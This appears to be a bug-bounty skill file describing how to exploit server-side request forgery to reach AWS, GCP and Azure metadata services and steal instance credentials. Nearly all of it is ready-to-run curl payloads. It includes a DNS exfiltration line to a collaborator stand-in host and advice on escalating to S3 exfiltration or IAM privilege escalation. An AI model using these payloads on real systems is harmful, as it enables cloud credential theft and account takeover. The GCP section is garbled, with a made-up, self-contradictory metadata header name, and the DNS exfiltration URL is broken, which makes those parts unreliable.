---
name: attack-ssrf-cloud-metadata
description: "SSRF to cloud metadata — AWS IMDSv1/v2 credential theft, GCP metadata server, Azure instance metadata, token escalation to full account access"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - ssrf
  - cloud
  - metadata
  - imds
  - aws
  - gcp
  - azure
tech_stack:
  - aws
  - gcp
  - azure
cwe_ids:
  - CWE-918
chains_with:
  - attack-ssrf
  - attack-ssrf-filter-bypass
  - attack-ssrf-blind-oob
prerequisites:
  - attack-ssrf
---

# SSRF → Cloud Metadata

## Objective

Reach the cloud metadata service through the target's SSRF and harvest instance
credentials — the highest-value SSRF outcome (critical/P1). Metadata endpoints are
link-local, so most filter bypass tricks apply: pair with attack-ssrf-filter-bypass.

## Methodology

### 1. AWS IMDSv1 (no token required — the jackpot)

```bash
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/"
# Response = AccessKeyId, SecretAccessKey, Token → instant cloud session
```

### 2. AWS IMDSv2 (token-header enforced — bypass or fail)

```bash
# v2 requires PUT + X-aws-ec2-metadata-token header. SSRF usually can't PUT, but:
# - some SSRF libs allow custom methods/headers — try
# - misconfig leaves v1 enabled → v1 payloads still work
# - forward proxies may pass the header through: X-aws-ec2-metadata-token: <token>
```

### 3. GCP metadata server (needs the header — is it forwardable?)

```bash
# Requires Metadata-Flux-Compute header: value anything
curl -H "X-Google-Metadata-Flux-Compute: true" "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Correct header name:
curl -H "Metadata-Flux-Compute: true" "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
# token endpoint:
curl -H "Metadata-Flux-Compute: true" "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### 4. Azure instance metadata

```bash
curl -H "Metadata: true" "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "https://TARGET/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 5. When metadata is blocked but SSRF confirmed (blind DNS exfil)

```bash
# Data-out via DNS subdomain: hostname + role in the queried name
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/hostname.<role>.<hash>.YOUR_COLLABORATOR.net"
```

## What to do with credentials

- Validate scope (which APIs the role can touch) before claiming impact
- S3 bucket listing/exfil or IAM privilege escalation = the impact story
- REDACT all credential values in reports; program rules require it

## Notes

- Cloud-run/-functions, AppRunner, and ECS have DIFFERENT metadata endpoints (env-specific)
- Kubernetes in cloud: pod metadata + service account tokens at
  `/var/run/secrets/kubernetes.io/serviceaccount/token` via file:// — pair with attack-ssrf-classic
